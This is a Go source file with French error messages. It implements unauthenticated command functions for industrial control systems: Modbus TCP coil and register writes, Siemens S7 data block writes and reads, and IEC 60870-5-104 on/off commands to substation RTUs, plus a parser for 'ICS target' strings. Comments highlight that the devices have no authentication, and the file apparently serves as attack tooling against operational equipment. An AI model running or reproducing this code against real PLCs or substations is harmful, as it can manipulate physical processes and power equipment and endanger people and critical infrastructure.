package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// Modbus TCP write (no auth — standard in most field deployments)
// ---------------------------------------------------------------------------

// ModbusWriteCoil writes a single coil (FC05). val: true=0xFF00, false=0x0000.
func ModbusWriteCoil(ip string, port, unit, addr int, val bool) error {
	conn, err := dialOT(ip, port)
	if err != nil {
		return err
	}
	defer conn.Close()

	data := uint16(0x0000)
	if val {
		data = 0xFF00
	}
	req := modbusReq(byte(unit), 0x05, func(b []byte) {
		binary.BigEndian.PutUint16(b[0:], uint16(addr))
		binary.BigEndian.PutUint16(b[2:], data)
	}, 4)
	_, err = conn.Write(req)
	if err != nil {
		return err
	}
	buf := make([]byte, 16)
	conn.Read(buf)
	return modbusErr(buf)
}

// ModbusWriteRegister writes a single holding register (FC06).
func ModbusWriteRegister(ip string, port, unit, addr, val int) error {
	conn, err := dialOT(ip, port)
	if err != nil {
		return err
	}
	defer conn.Close()

	req := modbusReq(byte(unit), 0x06, func(b []byte) {
		binary.BigEndian.PutUint16(b[0:], uint16(addr))
		binary.BigEndian.PutUint16(b[2:], uint16(val))
	}, 4)
	_, err = conn.Write(req)
	if err != nil {
		return err
	}
	buf := make([]byte, 16)
	conn.Read(buf)
	return modbusErr(buf)
}

// ModbusReadRegisters reads holding registers (FC03).
func ModbusReadRegisters(ip string, port, unit, addr, count int) ([]uint16, error) {
	conn, err := dialOT(ip, port)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	req := modbusReq(byte(unit), 0x03, func(b []byte) {
		binary.BigEndian.PutUint16(b[0:], uint16(addr))
		binary.BigEndian.PutUint16(b[2:], uint16(count))
	}, 4)
	if _, err := conn.Write(req); err != nil {
		return nil, err
	}
	buf := make([]byte, 9+count*2)
	n, err := conn.Read(buf)
	if err != nil || n < 9 {
		return nil, fmt.Errorf("réponse courte (%d octets)", n)
	}
	if err := modbusErr(buf); err != nil {
		return nil, err
	}
	byteCount := int(buf[8])
	regs := make([]uint16, byteCount/2)
	for i := range regs {
		regs[i] = binary.BigEndian.Uint16(buf[9+i*2:])
	}
	return regs, nil
}

func modbusReq(unit, fc byte, fill func([]byte), dataLen int) []byte {
	pdu := make([]byte, 1+dataLen)
	pdu[0] = fc
	fill(pdu[1:])
	mbap := make([]byte, 6+len(pdu))
	mbap[0], mbap[1] = 0x00, 0x01 // transaction ID
	mbap[2], mbap[3] = 0x00, 0x00 // protocol
	binary.BigEndian.PutUint16(mbap[4:], uint16(1+len(pdu)))
	mbap[6] = unit
	copy(mbap[7:], pdu)
	return mbap
}

func modbusErr(buf []byte) error {
	if len(buf) > 7 && buf[7]&0x80 != 0 {
		return fmt.Errorf("Modbus exception code %d", buf[8])
	}
	return nil
}

// ---------------------------------------------------------------------------
// Siemens S7Comm write (DB / merker — no auth on most S7 PLCs)
// ---------------------------------------------------------------------------

// S7WriteDB writes bytes to a Siemens S7 data block via S7Comm PUT.
// Requires: prior COTP+S7 setup (handled internally).
// db: data block number, start: byte offset, data: bytes to write.
func S7WriteDB(ip string, db, start int, data []byte) error {
	conn, err := dialOT(ip, 102)
	if err != nil {
		return err
	}
	defer conn.Close()

	// COTP Connection Request
	cr := []byte{
		0x03, 0x00, 0x00, 0x16,
		0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00,
		0xc0, 0x01, 0x0a,
		0xc1, 0x02, 0x01, 0x00,
		0xc2, 0x02, 0x01, 0x02,
	}
	if _, err := conn.Write(cr); err != nil {
		return fmt.Errorf("COTP CR: %v", err)
	}
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	if n < 6 || buf[5] != 0xd0 {
		return fmt.Errorf("COTP CC attendu, reçu: %x", buf[:min(n, 8)])
	}

	// S7Comm Setup Communication
	setup := []byte{
		0x03, 0x00, 0x00, 0x19,
		0x02, 0xf0, 0x80,
		0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
		0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0,
	}
	if _, err := conn.Write(setup); err != nil {
		return fmt.Errorf("S7 setup: %v", err)
	}
	n, _ = conn.Read(buf)
	if n < 7 || buf[8] != 0x03 {
		return fmt.Errorf("S7 setup réponse inattendue")
	}

	// S7Comm Write Request (FC=Write, area=0x84=DB, transport=4=BYTE)
	writeLen := len(data)
	varSpec := []byte{
		0x12, 0x0a, 0x10,
		0x02,                   // transport size: BYTE
		byte(writeLen >> 8), byte(writeLen),
		byte(db >> 8), byte(db),
		0x84,                   // area: DB
		byte(start >> 8 >> 8), byte(start >> 8), byte(start),
	}
	dataItem := append([]byte{
		0x00,             // reserved
		byte((writeLen * 8) >> 8), byte(writeLen * 8), // length in bits
	}, data...)
	if writeLen%2 != 0 {
		dataItem = append(dataItem, 0x00) // padding
	}

	paramLen := 2 + len(varSpec)
	dataLen := 4 + len(dataItem)
	pduLen := 10 + paramLen + dataLen

	pkt := make([]byte, 7+pduLen)
	// TPKT + COTP DT
	pkt[0], pkt[1], pkt[2], pkt[3] = 0x03, 0x00, byte((7+pduLen)>>8), byte(7+pduLen)
	pkt[4], pkt[5], pkt[6] = 0x02, 0xf0, 0x80
	// S7 header
	pkt[7] = 0x32  // S7 magic
	pkt[8] = 0x01  // job
	pkt[9], pkt[10] = 0x00, 0x00 // redundancy
	pkt[11], pkt[12] = 0x00, 0x01 // PDU ref
	pkt[13], pkt[14] = byte(paramLen>>8), byte(paramLen)
	pkt[15], pkt[16] = byte(dataLen>>8), byte(dataLen)
	// param
	pkt[17] = 0x05 // FC = write
	pkt[18] = 0x01 // item count
	copy(pkt[19:], varSpec)
	// data
	copy(pkt[19+len(varSpec):], dataItem)

	if _, err := conn.Write(pkt); err != nil {
		return fmt.Errorf("S7 write req: %v", err)
	}
	n, _ = conn.Read(buf)
	if n < 14 {
		return fmt.Errorf("S7 write réponse courte (%d)", n)
	}
	if buf[8] == 0x03 {
		return nil // ack data = success
	}
	return fmt.Errorf("S7 write erreur, type réponse: %02x", buf[8])
}

// S7ReadDB reads bytes from a Siemens S7 data block (no auth).
func S7ReadDB(ip string, db, start, length int) ([]byte, error) {
	conn, err := dialOT(ip, 102)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	// COTP CR
	cr := []byte{0x03, 0x00, 0x00, 0x16, 0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00,
		0xc0, 0x01, 0x0a, 0xc1, 0x02, 0x01, 0x00, 0xc2, 0x02, 0x01, 0x02}
	conn.Write(cr)
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	if n < 6 || buf[5] != 0xd0 {
		return nil, fmt.Errorf("COTP CC manquant")
	}
	// Setup comm
	setup := []byte{0x03, 0x00, 0x00, 0x19, 0x02, 0xf0, 0x80,
		0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
		0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0}
	conn.Write(setup)
	conn.Read(buf)

	// Read request
	readReq := []byte{
		0x03, 0x00, 0x00, 0x1f, 0x02, 0xf0, 0x80,
		0x32, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0e, 0x00, 0x00,
		0x04, 0x01,
		0x12, 0x0a, 0x10, 0x02,
		byte(length >> 8), byte(length),
		byte(db >> 8), byte(db),
		0x84,
		byte(start >> 8 >> 8), byte(start >> 8), byte(start),
	}
	conn.Write(readReq)
	n, err = conn.Read(buf)
	if err != nil || n < 25 {
		return nil, fmt.Errorf("S7 read réponse courte (%d)", n)
	}
	dataStart := 25
	if dataStart+length > n {
		return buf[dataStart:n], nil
	}
	return buf[dataStart : dataStart+length], nil
}

// ---------------------------------------------------------------------------
// IEC 60870-5-104 STARTDT + command (substation / RTU)
// ---------------------------------------------------------------------------

// IEC104SendCommand sends a single-command (C_SC_NA_1, type 0x2D) to a RTU.
// addr: ASDU common address, ioa: information object address, val: 0=off, 1=on.
func IEC104SendCommand(ip string, port, addr, ioa, val int) error {
	conn, err := dialOT(ip, port)
	if err != nil {
		return err
	}
	defer conn.Close()

	// STARTDT act
	conn.Write([]byte{0x68, 0x04, 0x07, 0x00, 0x00, 0x00})
	buf := make([]byte, 64)
	conn.Read(buf) // STARTDT con

	// C_SC_NA_1 (type 0x2D) — single command, COT=6 (activation)
	sco := byte(val & 0x01) // bit 0 = on/off
	apdu := []byte{
		0x68,               // start
		0x0e,               // APDU length = 14
		0x00, 0x00,         // send seq = 0
		0x00, 0x00,         // recv seq = 0
		0x2d,               // type = C_SC_NA_1
		0x01,               // VSQ: 1 object, no sequence
		0x06, 0x00,         // COT = 6 (activation)
		byte(addr), byte(addr >> 8), // common address (2 bytes)
		byte(ioa), byte(ioa >> 8), byte(ioa >> 16), // IOA (3 bytes)
		sco,
	}
	if _, err := conn.Write(apdu); err != nil {
		return fmt.Errorf("IEC104 command: %v", err)
	}
	n, _ := conn.Read(buf)
	if n > 0 && buf[6] == 0x2d {
		return nil
	}
	return fmt.Errorf("IEC104 pas de confirmation reçue")
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func dialOT(ip string, port int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp4", fmt.Sprintf("%s:%d", ip, port), 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn.SetDeadline(time.Now().Add(15 * time.Second))
	return conn, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ParseICSTarget parses "IP:PORT/ADDR/VALUE" or "IP/ADDR/VALUE" strings.
func ParseICSTarget(s string) (ip string, port, addr, value int, err error) {
	// format: ip[:port]/addr/value
	parts := strings.SplitN(s, "/", 3)
	if len(parts) < 3 {
		return "", 0, 0, 0, fmt.Errorf("format attendu: IP[:PORT]/ADDR/VAL — reçu: %q", s)
	}
	hostPort := parts[0]
	if strings.Contains(hostPort, ":") {
		h, p, e := net.SplitHostPort(hostPort)
		if e != nil {
			return "", 0, 0, 0, e
		}
		ip = h
		port, _ = strconv.Atoi(p)
	} else {
		ip = hostPort
	}
	addr, _ = strconv.Atoi(parts[1])
	value, _ = strconv.Atoi(parts[2])
	return
}
